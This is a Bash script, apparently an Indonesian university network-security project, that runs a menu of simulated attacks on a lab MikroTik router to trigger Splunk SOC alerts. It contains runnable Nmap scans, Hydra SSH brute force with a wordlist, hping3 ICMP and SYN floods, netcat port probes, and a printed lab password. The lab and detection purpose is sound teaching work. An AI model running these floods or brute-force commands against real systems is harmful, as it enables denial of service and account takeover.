#!/bin/bash
# ==============================================================================
# BERKAS SUMBER: mini-soc-project/kali-linux/attack_commands.sh
# DESKRIPSI: Skrip Otomasi Simulator Serangan Jaringan (Interactive Menu)
# TUGAS UAS: Keamanan Jaringan - Mini SOC Project
# TARGET LAB: MikroTik CHR Perimeter (192.168.169.1)
# ==============================================================================

# KONDISI WARNA UNTUK ANTARMUKA TERMINAL
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# KONFIGURASI PARAMETER JARIKAN LAB
TARGET_IP="192.168.169.1"
TARGET_SUBNET="192.168.169.0/24"
WORDLIST="/home/kali/passlist.txt"

# VALIDASI KETERSEDIAAN WORDLIST UNTUK HYDRA
if [ ! -f "$WORDLIST" ]; then
    echo -e "${YELLOW}[!] Peringatan: Berkas wordlist tidak ditemukan di $WORDLIST${NC}"
    echo -e "${YELLOW}[*] Membuat wordlist minimal otomatis untuk keperluan demo...${NC}"
    mkdir -p "$(dirname "$WORDLIST")"
    cat << EOF > "$WORDLIST"
admin123
password
toor
Adm1n#2024
EOF
    echo -e "${GREEN}[+] Wordlist berhasil dibuat di $WORDLIST${NC}"
fi

clear
echo -e "${BLUE}==================================================================${NC}"
# TERMINAL LOGO SIMULATOR SOC
echo -e "${RED}    __  ____       _   _____ ____  ______   _____ ___  ___${NC}"
echo -e "${RED}   /  |/  (_)___  (_) / ___// __ \/ ____/  / ___/ / / / / /${NC}"
echo -e "${RED}  / /|_/ / / __ \/ /  \__ \/ / / / /       \__ \ / / / / / ${NC}"
echo -e "${RED} / /  / / / / / / /  ___/ / /_/ / /___    ___/ / /_/_/_/_/  ${NC}"
echo -e "${RED}/_/  /_/_/_/ /_/_/  /____/\____/\____/   /____/\____(_)(_)  ${NC}"
echo -e "${BLUE}==================================================================${NC}"
echo -e "${YELLOW}Simulator Penetrasi Jaringan Jaringan Tertutup - Universitas VNL${NC}"
echo -e "Target Perimeter Router IP: ${GREEN}$TARGET_IP${NC}"
echo -e "Wordlist Target Path      : ${GREEN}$WORDLIST${NC}"
echo -e "${BLUE}------------------------------------------------------------------${NC}"

echo -e "\n${YELLOW}[⚠️  PERINGATAN WAJIB]${NC}"
echo -e "Pastikan Anda telah melakukan ${RED}RESET ADDRESS-LIST${NC} di terminal MikroTik"
echo -e "menggunakan perintah: ${GREEN}/ip firewall address-list remove [find address=192.168.169.2]${NC}"
echo -e "sebelum berpindah ke skenario serangan baru guna menghindari Walled-Off Effect.\n"

echo "Pilih Skenario Serangan yang akan Dieksekusi:"
echo "1) Skenario 1: Port Scanning (Nmap SYN Stealth Scan)"
echo "2) Skenario 2: Service & OS Enumeration (Nmap Banner Grabbing)"
echo "3) Skenario 3: SSH Brute Force Agresif (Hydra Fast Blacklist Test)"
echo "4) Skenario 4: SSH Brute Force Stealth (Hydra Slow Login Failure)"
echo "5) Skenario 5: ICMP Flood Attack (hping3 Network DoS)"
echo "6) Skenario 6: Network Policy Violation (Netcat Port Probe Complete)"
echo "7) Skenario 7: SYN Flood DoS Attack (hping3 Transport Overload)"
echo "8) Skenario 8: Skenario Khusus (Panduan Manual Account Compromise)"
echo "9) Keluar dari Simulator"
echo -e "${BLUE}------------------------------------------------------------------${NC}"
read -p "Masukkan pilihan Anda [1-9]: " pilihan

case $pilihan in
    1)
        echo -e "\n${GREEN}[*] Menjalankan Skenario 1: Port Scanning...${NC}"
        echo "Perintah: nmap -sS -p 1-1000 $TARGET_IP"
        nmap -sS -p 1-1000 $TARGET_IP
        ;;
    2)
        echo -e "\n${GREEN}[*] Menjalankan Skenario 2: Service Enumeration...${NC}"
        echo "Perintah: nmap -sV --script=banner -p 21,22,23,80 $TARGET_IP"
        nmap -sV --script=banner -p 21,22,23,80 $TARGET_IP
        ;;
    3)
        echo -e "\n${GREEN}[*] Menjalankan Skenario 3: SSH Brute Force Agresif...${NC}"
        echo "Perintah: hydra -l admin -P $WORDLIST ssh://$TARGET_IP -t 4 -V"
        hydra -l admin -P $WORDLIST ssh://$TARGET_IP -t 4 -V
        ;;
    4)
        echo -e "\n${GREEN}[*] Menjalankan Skenario 4: SSH Brute Force Stealth...${NC}"
        echo "Perintah: hydra -l admin -P $WORDLIST ssh://$TARGET_IP -t 1 -V"
        hydra -l admin -P $WORDLIST ssh://$TARGET_IP -t 1 -V
        ;;
    5)
        echo -e "\n${RED}[*] Menjalankan Skenario 5: ICMP Flood Attack (Timeout 15 Detik)...${NC}"
        echo "Perintah: sudo timeout 15 hping3 --icmp --flood $TARGET_IP"
        sudo timeout 15 hping3 --icmp --flood $TARGET_IP
        echo -e "\n${GREEN}[*] Menjalankan Sub-Skenario: Ping Sweep Subnet...${NC}"
        echo "Perintah: nmap -sn $TARGET_SUBNET"
        nmap -sn $TARGET_SUBNET
        ;;
    6)
        echo -e "\n${GREEN}[*] Menjalankan Skenario 6: Network Policy Violation...${NC}"
        for port in 23 21 80 8728 8291; do
            echo -e "${YELLOW}[+] Mengetes Akses Terlarang ke Port: $port...${NC}"
            nc -vz -w 2 $TARGET_IP $port
        done
        ;;
    7)
        echo -e "\n${RED}[*] Menjalankan Skenario 7: SYN Flood DoS Attack (Timeout 20 Detik)...${NC}"
        echo "Perintah: sudo timeout 20 hping3 -S -p 22 --flood $TARGET_IP"
        sudo timeout 20 hping3 -S -p 22 --flood $TARGET_IP
        ;;
    8)
        echo -e "\n${YELLOW}[*] PANDUAN MANUAL: Skenario Account Compromise${NC}"
        echo -e "Skenario ini membutuhkan interaksi manual ketikan password."
        echo -e "Langkah Eksekusi:"
        echo -e "1. Jalankan perintah di bawah pada jendela terminal baru:"
        echo -e "   ${GREEN}ssh admin@$TARGET_IP${NC}"
        echo -e "2. Masukkan password ${RED}SALAH${NC} sebanyak 3 kali berturut-turut hingga koneksi putus."
        echo -e "3. Jalankan kembali perintah login: ${GREEN}ssh admin@$TARGET_IP${NC}"
        echo -e "4. Masukkan password ${GREEN}BENAR (Adm1n#2024)${NC} pada kesempatan terakhir."
        echo -e "5. Periksa alert [ALERT-CRITICAL] di dashboard Splunk Anda."
        ;;
    9)
        echo -e "\n${GREEN}[+] Simulator dihentikan. Terima kasih.${NC}\n"
        exit 0
        ;;
    *)
        echo -e "\n${RED}[!] Pilihan tidak valid.${NC}\n"
        ;;
esac
